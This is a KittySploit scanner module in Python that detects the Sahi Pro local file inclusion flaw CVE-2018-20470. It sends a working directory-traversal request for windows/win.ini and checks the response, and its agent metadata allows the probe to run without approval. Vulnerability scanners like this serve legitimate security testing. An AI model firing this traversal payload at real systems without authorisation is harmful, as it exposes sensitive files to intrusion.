#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Tyto Sahi Pro versions through 7."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Tyto Sahi pro 7.x/8.x - Local File Inclusion Detection',
        'description': 'Tyto Sahi Pro versions through 7.x.x and 8.0.0 are susceptible to a local file inclusion vulnerability in the web reports module which can allow an outside attacker to view contents of sensitive files.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2018', 'lfi', 'packetstorm', 'sahipro', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://barriersec.com/2019/06/cve-2018-20470-sahi-pro/',
            'http://packetstormsecurity.com/files/153330/Sahi-Pro-7.x-8.x-Directory-Traversal.html',
            'https://nvd.nist.gov/vuln/detail/CVE-2018-20470',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2018-20470',
    }

    def run(self):
        r = self.http_request(method="GET", path='/_s_/dyn/Log_highlight?href=../../../../windows/win.ini&n=1#selected', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('bit app support', 'fonts', 'extensions',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='high',
                reason="Tyto Sahi pro 7.x/8.x - Local File Inclusion detected",
                path='/_s_/dyn/Log_highlight?href=../../../../windows/win.ini&n=1#selected',
            )
            return True
        return False

